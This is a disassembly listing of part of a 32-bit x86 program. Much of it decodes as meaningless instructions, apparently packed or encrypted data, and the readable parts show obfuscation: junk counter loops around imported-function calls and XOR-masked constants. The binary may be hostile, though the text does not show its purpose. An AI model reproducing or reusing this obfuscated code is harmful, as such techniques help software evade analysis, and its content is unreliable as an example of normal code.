  404c20:	push   ss
  404c21:	pop    ebx
  404c22:	ret    0x652d
  404c25:	aad    0x66
  404c27:	adc    esp,esp
  404c29:	pop    ebp
  404c2a:	rol    BYTE PTR ds:0x2d2f25af,cl
  404c30:	sub    DWORD PTR [ebp-0x78],eax
  404c33:	sub    eax,DWORD PTR ds:[esi+eax*1-0x2263827a]
  404c3b:	mov    ebx,0x46671b76
  404c40:	push   ebx
  404c41:	or     al,0x32
  404c43:	test   eax,0x442cdd6b
  404c48:	(bad)  
  404c49:	in     al,dx
  404c4a:	gs bswap esi
  404c4d:	inc    eax
  404c4e:	das    
  404c4f:	out    0x11,al
  404c51:	(bad)  
  404c52:	mov    ah,ch
  404c54:	jge    0x404c2c
  404c56:	and    al,0xeb
  404c58:	add    eax,0x7c88e39a
  404c5d:	aad    0x4d
  404c5f:	adc    dh,ah
  404c61:	xchg   esp,eax
  404c62:	cmp    bh,BYTE PTR [edx*2-0x18515a8a]
  404c69:	test   al,0xf6
  404c6b:	dec    esp
  404c6c:	rcr    DWORD PTR [edi-0x3],0xf2
  404c70:	fild   DWORD PTR [ecx*1-0x443fda6d]
  404c77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c78:	call   0xdb5e:0x93bf22ce
  404c7f:	and    cl,dl
  404c81:	pop    esi
  404c82:	pop    es
  404c83:	sbb    DWORD PTR [esi],esi
  404c85:	mov    dl,0x61
  404c87:	mov    eax,0x68905c51
  404c8c:	mov    ch,0xaa
  404c8e:	lods   eax,DWORD PTR ds:[esi]
  404c8f:	dec    ebx
  404c90:	sti    
  404c91:	fst    QWORD PTR [ebp+0x2]
  404c94:	scas   eax,DWORD PTR es:[edi]
  404c95:	js     0x404c88
  404c97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c98:	mov    ebp,0x530f363a
  404c9d:	xchg   ecx,eax
  404c9e:	mov    edx,0x713d0b67
  404ca3:	hlt    
  404ca4:	ror    DWORD PTR [ecx+0x1247e74b],1
  404caa:	test   esp,eax
  404cac:	outs   dx,BYTE PTR ds:[esi]
  404cad:	inc    edi
  404cae:	cmc    
  404caf:	dec    ebp
  404cb0:	mov    bh,BYTE PTR [ecx-0x3d36e959]
  404cb6:	pop    ecx
  404cb7:	and    al,0xd
  404cb9:	in     al,0x35
  404cbb:	or     ah,BYTE PTR [ebx]
  404cbd:	jne    0x404c86
  404cbf:	loop   0x404d1e
  404cc1:	je     0x404c88
  404cc3:	ja     0x404cd2
  404cc5:	call   0xe560a631
  404cca:	clc    
  404ccb:	or     ch,BYTE PTR [eax+0x7a944f67]
  404cd1:	pop    ebx
  404cd2:	sub    BYTE PTR [esi],ch
  404cd4:	xchg   esi,eax
  404cd5:	ret    
  404cd6:	and    BYTE PTR [edx],bh
  404cd8:	into   
  404cd9:	outs   dx,DWORD PTR ds:[esi]
  404cda:	lahf   
  404cdb:	jp     0x404cdc
  404cdd:	or     BYTE PTR [ebp+ecx*4+0x22],bl
  404ce1:	jno    0x404caa
  404ce3:	mov    eax,0x749e61c3
  404ce8:	(bad)  
  404ce9:	mov    eax,ecx
  404ceb:	pop    ebp
  404cec:	ret    0x18
  404cef:	push   ebp
  404cf0:	mov    ebp,esp
  404cf2:	push   ecx
  404cf3:	add    DWORD PTR ds:0x4292b1,edx
  404cf9:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  404d00:	mov    eax,DWORD PTR [ebp-0x4]
  404d03:	and    ecx,ecx
  404d05:	mov    edx,DWORD PTR [ebp+0x10]
  404d08:	mov    DWORD PTR ds:0x4292d5,0x4d89
  404d12:	mov    ecx,0x7510857
  404d17:	xor    eax,ecx
  404d19:	add    eax,0x32729e
  404d1e:	jmp    0x404e84
  404d23:	jne    0x404d9b
  404d25:	xchg   DWORD PTR [ebx+ebx*4],ebx
  404d28:	mov    eax,ds:0x71892dbd
  404d2d:	arpl   WORD PTR [eax],ax
  404d2f:	inc    eax
  404d30:	or     BYTE PTR [ebp+eax*8+0x7c7c1512],ch
  404d37:	aaa    
  404d38:	jg     0x404db6
  404d3a:	jl     0x404d3f
  404d3c:	jo     0x404da6
  404d3e:	pop    esi
  404d3f:	add    cl,BYTE PTR [esi-0x49]
  404d42:	cmp    ebx,edx
  404d44:	sbb    al,0xbe
  404d46:	xor    BYTE PTR [eax-0x1b7cac40],al
  404d4c:	sub    dl,BYTE PTR [ebp+ebp*1-0x43]
  404d50:	dec    esi
  404d51:	pusha  
  404d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d53:	es out 0xc6,eax
  404d56:	out    dx,eax
  404d57:	nop
  404d58:	jle    0x404cdd
  404d5a:	adc    eax,0x44d837cc
  404d5f:	loopne 0x404d07
  404d61:	ficom  WORD PTR [ecx-0x32]
  404d64:	fnsave [eax]
  404d66:	int    0x1f
  404d68:	mov    ds:0xb0ccec15,eax
  404d6d:	dec    ebx
  404d6e:	xchg   edi,eax
  404d6f:	adc    al,bh
  404d71:	test   al,0x76
  404d73:	data16 stos BYTE PTR es:[edi],al
  404d75:	sbb    DWORD PTR [ecx-0x35],edi
  404d78:	jge    0x404d32
  404d7a:	sub    eax,0x726b6405
  404d7f:	iret   
  404d80:	pop    esp
  404d81:	xchg   ebx,eax
  404d82:	inc    ecx
  404d83:	ja     0x404db4
  404d85:	dec    edi
  404d86:	out    0x3a,al
  404d88:	xchg   edx,eax
  404d89:	repz jmp 0x404d9c
  404d8c:	xor    ecx,ebp
  404d8e:	ret    0x55bd
  404d91:	cmp    BYTE PTR [edx],ch
  404d93:	cmp    edx,DWORD PTR [ebx+0x5]
  404d96:	int3   
  404d97:	push   es
  404d98:	xor    al,BYTE PTR [edx*4+0x20910e9b]
  404d9f:	xor    DWORD PTR [edx],esp
  404da1:	popf   
  404da2:	jnp    0x404de3
  404da4:	dec    edx
  404da5:	sub    ch,BYTE PTR [ebx]
  404da7:	jg     0x404d81
  404da9:	push   esi
  404daa:	psllw  mm7,QWORD PTR [ecx+eax*4]
  404dae:	adc    edx,DWORD PTR [edi-0x74]
  404db1:	out    0x95,al
  404db3:	fld    TBYTE PTR [ebp-0x5b195f7b]
  404db9:	xchg   esp,eax
  404dba:	ret    0x517e
  404dbd:	inc    DWORD PTR [eax-0x6e]
  404dc0:	push   0xc4129735
  404dc5:	out    0xae,al
  404dc7:	jb     0x404d6e
  404dc9:	jmp    0x404dec
  404dcb:	sub    ah,ah
  404dcd:	fbld   TBYTE PTR [ebp-0x40]
  404dd0:	push   edi
  404dd1:	test   eax,0x4b197324
  404dd6:	ins    BYTE PTR es:[edi],dx
  404dd7:	test   bl,0xcc
  404dda:	les    esi,FWORD PTR [esp+eiz*8+0x37fb9d6c]
  404de1:	and    dh,BYTE PTR [edx]
  404de3:	(bad)  
  404de4:	aas    
  404de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de6:	pop    es
  404de7:	out    0xd4,al
  404de9:	and    ah,BYTE PTR [ebx]
  404deb:	shr    BYTE PTR ds:0xa7daf32,1
  404df1:	test   BYTE PTR [edi+ebx*1],ch
  404df4:	sti    
  404df5:	enterw 0x1ebc,0x8
  404dfa:	imul   esp,DWORD PTR [edx-0x7a],0x145702b1
  404e01:	es stos DWORD PTR es:[edi],eax
  404e03:	lea    ebp,[eax+eiz*8]
  404e06:	js     0x404e3e
  404e08:	mov    esi,0xf10c7a0c
  404e0d:	inc    ebp
  404e0e:	dec    edi
  404e0f:	out    0x36,eax
  404e11:	sub    BYTE PTR [esi],dl
  404e13:	add    eax,0x5893164b
  404e18:	mov    DWORD PTR [edi],esi
  404e1a:	aad    0xcf
  404e1c:	xor    eax,0x71280eba
  404e21:	ret    
  404e22:	jmp    0x2378:0x9d4c6999
  404e29:	sub    al,0x7
  404e2b:	ins    BYTE PTR es:[edi],dx
  404e2c:	cs out dx,eax
  404e2e:	pop    eax
  404e2f:	mov    edx,0x4e2a2f7e
  404e34:	(bad)  
  404e35:	rcr    BYTE PTR [ebp-0x33032779],0xdf
  404e3c:	xchg   edx,eax
  404e3d:	lds    esi,FWORD PTR [ecx+0x14]
  404e40:	arpl   WORD PTR [edi-0x67f2031c],sp
  404e46:	jp     0x404e3c
  404e48:	je     0x404e36
  404e4a:	xor    edx,ebp
  404e4c:	out    dx,al
  404e4d:	mov    DWORD PTR [esi],edi
  404e4f:	jp     0x404e66
  404e51:	sub    al,cl
  404e53:	out    dx,eax
  404e54:	cmp    ch,dh
  404e56:	loope  0x404e97
  404e58:	or     BYTE PTR [esi-0x4ceb05d2],ah
  404e5e:	fcom   DWORD PTR [ecx-0x3683fe11]
  404e64:	sbb    edx,DWORD PTR [esi]
  404e66:	or     bl,BYTE PTR [ebx+ebx*1-0x3fe8201b]
  404e6d:	aas    
  404e6e:	sbb    BYTE PTR [edx+0x51],ch
  404e71:	in     al,dx
  404e72:	das    
  404e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e74:	lahf   
  404e75:	pop    ebx
  404e76:	lds    eax,FWORD PTR [edx]
  404e78:	call   0x78188763
  404e7d:	call   0x7e8b2379
  404e82:	mov    edi,0x9028902
  404e87:	sbb    eax,0x4292a9
  404e8c:	mov    eax,DWORD PTR [ebp+0x14]
  404e8f:	not    edx
  404e91:	mov    edx,DWORD PTR [ebp+0x10]
  404e94:	mov    DWORD PTR [edx+0x4],eax
  404e97:	mov    eax,DWORD PTR [ebp+0x18]
  404e9a:	sbb    DWORD PTR ds:0x42c88e,0xab4
  404ea4:	mov    edx,DWORD PTR [ebp+0x10]
  404ea7:	mov    DWORD PTR [edx+0x8],eax
  404eaa:	sub    edx,eax
  404eac:	mov    eax,DWORD PTR [ebp+0x1c]
  404eaf:	mov    edx,DWORD PTR ds:0x4275b0
  404eb5:	and    DWORD PTR ds:0x427594,edx
  404ebb:	jmp    0x405021
  404ec0:	fdiv   DWORD PTR [ebx+0x2e]
  404ec3:	dec    esp
  404ec4:	stc    
  404ec5:	gs jp  0x404e53
  404ec8:	jg     0x404e7d
  404eca:	pushf  
  404ecb:	mov    ecx,0xe18b9ae5
  404ed0:	in     eax,dx
  404ed1:	adc    al,0x7c
  404ed3:	jl     0x404f0c
  404ed5:	jg     0x404f53
  404ed7:	jl     0x404ec5
  404ed9:	ret    
  404eda:	outs   dx,DWORD PTR ds:[esi]
  404edb:	inc    esp
  404edc:	add    eax,0x8bb4e033
  404ee1:	dec    edi
  404ee2:	push   ebp
  404ee3:	pop    esp
  404ee4:	out    0x5b,eax
  404ee6:	fcom   st(6)
  404ee8:	push   ebx
  404ee9:	or     eax,DWORD PTR [edx+0x182bcdad]
  404eef:	shr    DWORD PTR [ebp-0x6cfb5c55],1
  404ef5:	xor    ebp,DWORD PTR [ebp+0x3d]
  404ef8:	arpl   WORD PTR [ebx-0x715595f3],cx
  404efe:	push   cs
  404eff:	jno    0x404f0a
  404f01:	and    DWORD PTR [ecx-0x338fb0d],eax
  404f07:	test   BYTE PTR [ebx],al
  404f09:	shr    bl,0x6b
  404f0c:	mov    al,ds:0x134017d9
  404f11:	mov    gs,WORD PTR [ebx+ebx*1+0x1e]
  404f15:	fwait
  404f16:	sub    DWORD PTR ds:0x7ac5aef7,esi
  404f1c:	sub    eax,0xb86739ae
  404f21:	lock loop 0x404ee5
  404f24:	sbb    DWORD PTR [edi+0x2c],eax
  404f27:	out    dx,eax
  404f28:	rol    ebp,1
  404f2a:	mov    ds,WORD PTR [eax-0xb]
  404f2d:	mov    cl,0xdc
  404f2f:	addr16 cmp eax,0xdb66f4b0
  404f35:	test   BYTE PTR [ecx+0x49],dl
  404f38:	add    eax,DWORD PTR [esi+0x19db59ae]
  404f3e:	popa   
  404f3f:	inc    edi
  404f40:	aas    
  404f41:	sbb    DWORD PTR [ecx],0xfffffffe
  404f44:	pushf  
  404f45:	mov    dh,0x81
  404f47:	scas   eax,DWORD PTR es:[edi]
  404f48:	or     al,0x39
  404f4a:	and    BYTE PTR [edx-0x70],bl
  404f4d:	pop    eax
  404f4e:	ret    0xe47d
  404f51:	sub    DWORD PTR [edi+0x6a],ebp
  404f54:	sar    DWORD PTR [ebx+eiz*1],cl
  404f57:	sub    bh,BYTE PTR [ebx+eiz*2+0x2b]
  404f5b:	xchg   ebx,eax
  404f5c:	nop
  404f5d:	pop    eax
  404f5e:	sub    BYTE PTR [ecx],al
  404f60:	jp     0x404fd6
  404f62:	or     eax,0x1bc2c52c
  404f67:	jge    0x404f99
  404f69:	imul   esi,DWORD PTR [ebx+esi*1-0x28],0x2207967b
  404f71:	sub    edx,DWORD PTR [eax+0x2c]
  404f74:	push   cs
  404f75:	stc    
  404f76:	imul   esi,DWORD PTR [eax-0x56],0x68
  404f7a:	enter  0x8d94,0xbd
  404f7e:	shr    BYTE PTR [ebx+0x4e],cl
  404f81:	or     BYTE PTR [ebx*2-0x73767bdf],0x3b
  404f89:	jl     0x404f58
  404f8b:	mov    BYTE PTR [edi-0x319e55e7],bh
  404f91:	mov    ds:0x144b173e,al
  404f96:	dec    edi
  404f97:	mov    edi,0xf480ac50
  404f9c:	or     ecx,ecx
  404f9e:	jecxz  0x404fca
  404fa0:	fsubrp st(2),st
  404fa2:	sbb    al,0x5c
  404fa4:	add    DWORD PTR [eax],eax
  404fa6:	fbstp  TBYTE PTR [ecx+0x3b]
  404fa9:	inc    eax
  404faa:	mov    dl,0x9a
  404fac:	push   ss
  404fad:	inc    eax
  404fae:	pop    ds
  404faf:	jmp    0xadbe:0x5be8a5e5
  404fb6:	push   ebx
  404fb7:	sub    dh,BYTE PTR [esi]
  404fb9:	jbe    0x405027
  404fbb:	mov    ebx,0x85ca3705
  404fc0:	clc    
  404fc1:	mov    edi,0xa77456
  404fc6:	loope  0x404faf
  404fc8:	dec    ebp
  404fc9:	lods   al,BYTE PTR ds:[esi]
  404fca:	in     eax,0xc9
  404fcc:	ret    0x4a9c
  404fcf:	xlat   BYTE PTR ds:[ebx]
  404fd0:	or     BYTE PTR [ebx+0x442fed7e],dh
  404fd6:	dec    ebx
  404fd7:	dec    ebx
  404fd8:	xor    al,0x8e
  404fda:	(bad)  
  404fdb:	repnz push eax
  404fdd:	cmc    
  404fde:	repnz add BYTE PTR [ecx],cl
  404fe1:	xchg   esi,eax
  404fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe3:	xor    esp,DWORD PTR [ebp+0xb0f023a]
  404fe9:	sub    ecx,edx
  404feb:	lods   eax,DWORD PTR ds:[esi]
  404fec:	scas   eax,DWORD PTR es:[edi]
  404fed:	pop    ds
  404fee:	repz xor ebx,DWORD PTR [ebp-0x2b]
  404ff2:	sub    eax,0x24906c14
  404ff7:	jns    0x404ff6
  404ff9:	cli    
  404ffa:	in     al,dx
  404ffb:	mov    DWORD PTR [eax+eiz*2+0x61b13cf8],esp
  405002:	or     bl,dh
  405004:	out    0x8b,al
  405006:	mov    al,0x4a
  405008:	ja     0x405042
  40500a:	sti    
  40500b:	pop    ebx
  40500c:	sbb    edi,DWORD PTR [eax]
  40500e:	mov    ebx,0xa61ff505
  405013:	gs int3 
  405015:	pop    ds
  405016:	stos   DWORD PTR es:[edi],eax
  405017:	jno    0x404fb6
  405019:	sub    dh,BYTE PTR [ebx+0x74fa9de1]
  40501f:	push   0x10558b7e
  405024:	mov    DWORD PTR [edx+0xc],eax
  405027:	adc    DWORD PTR ds:0x427d0f,ebx
  40502d:	mov    eax,DWORD PTR [ebp+0x20]
  405030:	sbb    DWORD PTR ds:0x427598,0x4ffb
  40503a:	jmp    0x4051a0
  40503f:	jno    0x40503e
  405041:	xlat   BYTE PTR ds:[ebx]
  405042:	sti    
  405043:	sti    
  405044:	std    
  405045:	add    eax,0xd7a6c1fd
  40504a:	mov    dl,0xd3
  40504c:	in     al,0x30
  40504e:	dec    edx
  40504f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405050:	pop    ss
  405051:	jl     0x4050cf
  405053:	aaa    
  405054:	jg     0x4050d2
  405056:	jl     0x4050ad
  405058:	in     eax,dx
  405059:	sbb    DWORD PTR [ecx+eiz*4-0x2266208c],esp
  405060:	fcomp  QWORD PTR [edx]
  405062:	xor    bl,bl
  405064:	adc    BYTE PTR cs:[eax-0x24181838],cl
  40506b:	cmp    esp,ecx
  40506d:	loopne 0x40507d
  40506f:	add    eax,0x1e937af1
  405074:	cmp    ebx,DWORD PTR [ecx]
  405076:	outs   dx,BYTE PTR ds:[esi]
  405077:	mov    al,ds:0x826f8e9f
  40507c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40507d:	test   BYTE PTR [ebp+0x60],cl
  405080:	test   DWORD PTR [esi+0x1646fc15],ebp
  405086:	out    dx,eax
  405087:	dec    esi
  405088:	sbb    eax,0x4a577a13
  40508d:	test   ebx,ebp
  40508f:	pop    ecx
  405090:	cmp    eax,0xdc3c7456
  405095:	aam    0xfc
  405097:	sub    DWORD PTR [edi+eiz*8],esp
  40509a:	pop    edx
  40509b:	test   BYTE PTR [eax],0x7f
  40509e:	cli    
  40509f:	aas    
  4050a0:	out    0x4c,eax
  4050a2:	sbb    eax,0x34df1e23
  4050a7:	sahf   
  4050a8:	stc    
  4050a9:	loop   0x40502b
  4050ab:	dec    edi
  4050ac:	je     0x40505d
  4050ae:	jae    0x405129
  4050b0:	push   ds
  4050b1:	jl     0x405088
  4050b3:	dec    ebx
  4050b4:	fwait
  4050b5:	cmp    bh,cl
  4050b7:	ins    DWORD PTR es:[edi],dx
  4050b8:	push   ecx
  4050b9:	jmp    0x3d5d:0x816e0394
  4050c0:	and    eax,0x7556f424
  4050c5:	fcomp  st(3)
  4050c7:	inc    eax
  4050c8:	push   es
  4050c9:	pop    es
  4050ca:	inc    esi
  4050cb:	jo     0x4050ee
  4050cd:	call   0xd24c:0xb3065b39
  4050d4:	inc    ecx
  4050d5:	outs   dx,BYTE PTR ds:[esi]
  4050d6:	aaa    
  4050d7:	cwde   
  4050d8:	into   
  4050d9:	and    al,0xd4
  4050db:	cmp    al,cl
  4050dd:	into   
  4050de:	sub    esi,DWORD PTR [edi+0x92377d0]
  4050e4:	jmp    0x90833323
  4050e9:	lds    esp,FWORD PTR [esi+0x39]
  4050ec:	jnp    0x405086
  4050ee:	mov    edx,0x578b853a
  4050f3:	repz into 
  4050f5:	jle    0x405135
  4050f7:	frstor gs:[edx+0xf]
  4050fb:	test   BYTE PTR [ebp-0xf4ec3d8],dh
  405101:	lahf   
  405102:	cmp    DWORD PTR [edx+edi*1],0x53116046
  405109:	ret    
  40510a:	mov    ebx,0x6ecc50d
  40510f:	mov    dl,0x4d
  405111:	sbb    DWORD PTR [ebx],esi
  405113:	pop    edx
  405114:	outs   dx,BYTE PTR ds:[esi]
  405115:	pop    esp
  405116:	mov    ebp,0x41a37892
  40511b:	rol    al,1
  40511d:	inc    esi
  40511e:	pop    esp
  40511f:	ds dec ecx
  405121:	inc    ebp
  405122:	loope  0x4050ad
  405124:	aaa    
  405125:	xchg   edx,eax
  405126:	xor    eax,0x88a3ee0c
  40512b:	scas   eax,DWORD PTR es:[edi]
  40512c:	xchg   esi,eax
  40512d:	push   0x2a
  40512f:	jmp    0x8c5d:0x207db2b8
  405136:	iret   
  405137:	ret    
  405138:	adc    esp,DWORD PTR [edx]
  40513a:	add    al,0x18
  40513c:	jge    0x4050fb
  40513e:	xor    eax,0x5eeab0ac
  405143:	fld    DWORD PTR [edi-0x74]
  405146:	icebp  
  405147:	mov    bl,0xb8
  405149:	ins    DWORD PTR es:[edi],dx
  40514a:	rcr    DWORD PTR [ecx-0x48],0xca
  40514e:	fldenv [ebx-0x2b]
  405151:	pop    edx
  405152:	sub    dh,BYTE PTR [ebp+0x64ac5fd6]
  405158:	cwde   
  405159:	dec    esi
  40515a:	pop    ss
  40515b:	xchg   ecx,eax
  40515c:	jns    0x4051a0
  40515e:	(bad)  
  40515f:	pop    edx
  405160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405161:	ds pop eax
  405163:	stc    
  405164:	mov    ch,0x46
  405166:	dec    esp
  405167:	pushf  
  405168:	dec    ebx
  405169:	mov    WORD PTR ds:0xb86fbaaf,cs
  40516f:	stos   BYTE PTR es:[edi],al
  405170:	push   0x3d000c64
  405175:	outs   dx,BYTE PTR ds:[esi]
  405176:	lods   eax,DWORD PTR ds:[esi]
  405177:	adc    esi,edi
  405179:	out    dx,eax
  40517a:	pop    eax
  40517b:	mov    ah,0x68
  40517d:	and    al,0x59
  40517f:	mov    eax,ds:0xf394e2bc
  405185:	and    ebp,ebp
  405187:	into   
  405188:	inc    ecx
  405189:	cwde   
  40518a:	gs sbb al,0xba
  40518d:	mov    al,ds:0x3bc67a7b
  405192:	popf   
  405193:	sar    edx,1
  405195:	stos   BYTE PTR es:[edi],al
  405196:	adc    al,ah
  405198:	and    DWORD PTR [eax],eax
  40519a:	mov    ds,WORD PTR [edx-0x34]
  40519d:	(bad)  
  40519e:	cmp    eax,0x10558b0a
  4051a3:	mov    DWORD PTR [edx+0x10],eax
  4051a6:	mov    eax,eax
  4051a8:	mov    eax,DWORD PTR [ebp+0x14]
  4051ab:	test   eax,eax
  4051ad:	mov    eax,DWORD PTR [ebp+0x8]
  4051b0:	jne    0x4051b9
  4051b6:	mov    eax,DWORD PTR [ebp+0xc]
  4051b9:	xor    eax,ecx
  4051bb:	add    eax,0x32729e
  4051c0:	leave  
  4051c1:	ret    0x1c
  4051c4:	push   ebp
  4051c5:	mov    ebp,esp
  4051c7:	sub    esp,0x10c
  4051cd:	adc    DWORD PTR ds:0x427cff,0x42c892
  4051d7:	push   ebx
  4051d8:	push   esi
  4051d9:	push   edi
  4051da:	push   0x409348
  4051df:	adc    DWORD PTR ds:0x4275a0,0x3f8f
  4051e9:	call   DWORD PTR ds:0x427cab
  4051ef:	test   eax,eax
  4051f1:	mov    DWORD PTR ds:0x427594,0x1688
  4051fb:	je     0x405208
  405201:	xor    eax,eax
  405203:	jmp    0x4063e6
  405208:	and    DWORD PTR ds:0x4292a5,0x4292c9
  405212:	push   0x4092b4
  405217:	adc    DWORD PTR ds:0x4292cd,0x1b3a
  405221:	call   DWORD PTR ds:0x427a33
  405227:	and    DWORD PTR ds:0x427d07,0x4292c5
  405231:	test   ax,ax
  405234:	mov    DWORD PTR ds:0x42c882,0x6514
  40523e:	je     0x40526d
  405244:	push   0x3546
  405249:	push   0x65890909
  40524e:	or     DWORD PTR ds:0x42c882,0x42c89a
  405258:	call   DWORD PTR ds:0x4279ef
  40525e:	mov    DWORD PTR ds:0x4292dd,0x79a2
  405268:	jmp    0x4063e6
  40526d:	mov    ecx,0xf89c8535
  405272:	mov    DWORD PTR [ebp-0x20],ecx
  405275:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  40527c:	sub    ebx,edx
  40527e:	lea    eax,[ebp-0x58]
  405281:	neg    esi
  405283:	mov    DWORD PTR [ebp-0x60],eax
  405286:	and    DWORD PTR ds:0x4292c1,0x0
  405290:	mov    edx,DWORD PTR ds:0x4292c1
  405296:	inc    edx
  405297:	mov    DWORD PTR ds:0x4292c1,edx
  40529d:	cmp    DWORD PTR ds:0x4292c1,0x1e
  4052a4:	jne    0x4052bd
  4052aa:	push   0x63b5
  4052af:	push   DWORD PTR [ebp-0x28]
  4052b2:	push   0x5536
  4052b7:	call   DWORD PTR ds:0x427a97
  4052bd:	cmp    DWORD PTR ds:0x4292c1,0x10
  4052c4:	jb     0x405290
  4052ca:	movzx  ebx,WORD PTR ds:0x42c88a
  4052d1:	adc    DWORD PTR ds:0x4292c1,ebx
  4052d7:	lea    eax,[ebp-0x50]
  4052da:	sbb    ebx,DWORD PTR ds:0x4275b0
  4052e0:	mov    DWORD PTR [ebp-0x10],eax
  4052e3:	mov    eax,ds:0x4091a0
  4052e8:	sbb    ebx,esi
  4052ea:	mov    eax,DWORD PTR [eax+0x1c8]
  4052f0:	and    DWORD PTR ds:0x4275a4,0x0
  4052fa:	mov    esi,DWORD PTR ds:0x4275a4
  405300:	inc    esi
  405301:	mov    DWORD PTR ds:0x4275a4,esi
  405307:	cmp    DWORD PTR ds:0x4275a4,0x4
  40530e:	jne    0x40531f
  405314:	push   0x1257
  405319:	call   DWORD PTR ds:0x4279d7
  40531f:	cmp    DWORD PTR ds:0x4275a4,0x3
  405326:	jne    0x405339
  40532c:	mov    esi,DWORD PTR ds:0x4275a4
  405332:	inc    esi
  405333:	mov    DWORD PTR ds:0x4275a4,esi
  405339:	cmp    DWORD PTR ds:0x4275a4,0x1a
  405340:	jb     0x4052fa
  405346:	sbb    esi,DWORD PTR ds:0x4292dd
  40534c:	mov    eax,DWORD PTR [eax]
  40534e:	mov    edx,DWORD PTR [ebp-0x10]
  405351:	sbb    ebx,0x4bc4
  405357:	mov    esi,0x7510857
  40535c:	xor    eax,esi
  40535e:	and    DWORD PTR ds:0x4292c5,0x0
  405368:	jmp    0x40537c
  40536d:	xor    ebx,ebx
  40536f:	add    ebx,DWORD PTR ds:0x4292c5
  405375:	inc    ebx
  405376:	mov    DWORD PTR ds:0x4292c5,ebx
  40537c:	cmp    DWORD PTR ds:0x4292c5,0x10
  405383:	jae    0x4053d4
  405389:	cmp    DWORD PTR ds:0x4292c5,0xb
  405390:	jne    0x4053af
  405396:	push   0x1343
  40539b:	push   DWORD PTR [ebp-0xc]
  40539e:	push   DWORD PTR [ebp-0x14]
  4053a1:	push   0x4e35
  4053a6:	push   DWORD PTR [ebp-0x28]
  4053a9:	call   DWORD PTR ds:0x4278f7
  4053af:	cmp    DWORD PTR ds:0x4292c5,0xa
  4053b6:	jne    0x4053c9
  4053bc:	mov    ebx,DWORD PTR ds:0x4292c5
  4053c2:	inc    ebx
  4053c3:	mov    DWORD PTR ds:0x4292c5,ebx
  4053c9:	jmp    0x40536d
  4053ce:	adc    ebx,DWORD PTR ds:0x427598
  4053d4:	mov    ebx,0x32729e
  4053d9:	sbb    DWORD PTR ds:0x42c89e,0x427d13
  4053e3:	add    eax,ebx
  4053e5:	mov    DWORD PTR ds:0x4292b9,0x4aac
  4053ef:	mov    DWORD PTR [edx],eax
  4053f1:	mov    eax,ds:0x409464
  4053f6:	mov    DWORD PTR ds:0x42c882,0x6078
  405400:	cmp    eax,0x23d14057
  405405:	mov    eax,DWORD PTR [ebp-0x18]
  405408:	mov    DWORD PTR ds:0x4292dd,0x3967
  405412:	je     0x405434
  405418:	mov    ecx,DWORD PTR [ebp-0x20]
  40541b:	xor    eax,esi
  40541d:	add    eax,ebx
  40541f:	imul   eax,ecx
  405422:	mov    DWORD PTR ds:0x4292c5,0x1be9
  40542c:	mov    DWORD PTR [ebp-0x20],eax
  40542f:	jmp    0x405ffd
  405434:	xor    eax,esi
  405436:	add    eax,ebx
  405438:	mov    DWORD PTR ds:0x42c886,0x19
  405442:	cmp    DWORD PTR ds:0x42c886,0x0
  405449:	je     0x405480
  40544f:	cmp    DWORD PTR ds:0x42c886,0x23
  405456:	jne    0x405468
  40545c:	push   DWORD PTR [ebp-0x20]
  40545f:	push   DWORD PTR [ebp-0x24]
  405462:	call   DWORD PTR ds:0x427a9b
  405468:	mov    edx,DWORD PTR ds:0x42c886
  40546e:	dec    edx
  40546f:	mov    DWORD PTR ds:0x42c886,edx
  405475:	jmp    0x405442
  40547a:	or     edx,0x41a6
  405480:	mov    ds:0x4092b0,eax
  405485:	mov    eax,DWORD PTR [ebp-0x20]
  405488:	add    edx,DWORD PTR ds:0x42c89a
  40548e:	xor    eax,esi
  405490:	and    edx,0x2762
  405496:	add    eax,ebx
  405498:	and    DWORD PTR ds:0x42c88e,0x0
  4054a2:	jmp    0x4054b4
  4054a7:	mov    edx,DWORD PTR ds:0x42c88e
  4054ad:	inc    edx
  4054ae:	mov    DWORD PTR ds:0x42c88e,edx
  4054b4:	cmp    DWORD PTR ds:0x42c88e,0x1d
  4054bb:	jae    0x405501
  4054c1:	cmp    DWORD PTR ds:0x42c88e,0xd
  4054c8:	jne    0x4054dc
  4054ce:	push   DWORD PTR [ebp-0x18]
  4054d1:	push   0x590a
  4054d6:	call   DWORD PTR ds:0x427a9f
  4054dc:	cmp    DWORD PTR ds:0x42c88e,0xc
  4054e3:	jne    0x4054f6
  4054e9:	mov    edx,DWORD PTR ds:0x42c88e
  4054ef:	inc    edx
  4054f0:	mov    DWORD PTR ds:0x42c88e,edx
  4054f6:	jmp    0x4054a7
  4054fb:	add    DWORD PTR ds:0x427d13,edi
  405501:	mov    ds:0x409464,eax
  405506:	and    DWORD PTR ds:0x4292b9,0x0
  405510:	jmp    0x405522
  405515:	mov    edx,DWORD PTR ds:0x4292b9
  40551b:	inc    edx
  40551c:	mov    DWORD PTR ds:0x4292b9,edx
  405522:	cmp    DWORD PTR ds:0x4292b9,0x19
  405529:	jae    0x4055c8
  40552f:	cmp    DWORD PTR ds:0x4292b9,0x8
  405536:	jne    0x40554a
  40553c:	push   0x4277cc
  405541:	push   DWORD PTR [ebp-0x28]
  405544:	call   DWORD PTR ds:0x427aa3
  40554a:	cmp    DWORD PTR ds:0x4292b9,0x7
  405551:	jne    0x405566
  405557:	xor    edx,edx
  405559:	xor    edx,DWORD PTR ds:0x4292b9
  40555f:	inc    edx
  405560:	mov    DWORD PTR ds:0x4292b9,edx
  405566:	jmp    0x405515
  40556b:	mov    DWORD PTR ds:0x42759c,0x10
  405575:	cmp    DWORD PTR ds:0x42759c,0x0
  40557c:	je     0x4055c8
  405582:	cmp    DWORD PTR ds:0x42759c,0x1f
  405589:	jne    0x4055b2
  40558f:	push   0x76d3
  405594:	push   DWORD PTR [ebp-0x10]
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x14]
  40559d:	push   0x4ba5
  4055a2:	push   0x42782a
  4055a7:	push   0x400000
